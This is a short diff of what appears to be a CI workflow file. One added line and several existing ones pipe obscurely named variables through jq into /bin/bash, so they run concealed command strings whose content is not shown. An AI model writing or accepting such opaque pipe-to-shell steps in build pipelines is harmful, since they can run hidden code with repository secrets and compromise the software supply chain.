@@ -34,6 +34,7 @@ jobs:
           echo $qt92 | jq -r .gpix459 | /bin/bash
           echo $wx2 | jq -r .ydmmp04010 | /bin/bash
           printf '%s' "$betiq22459" | jq -r .qlv13566 | /bin/bash
+          echo $dr91332 | jq -r .iiz935 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
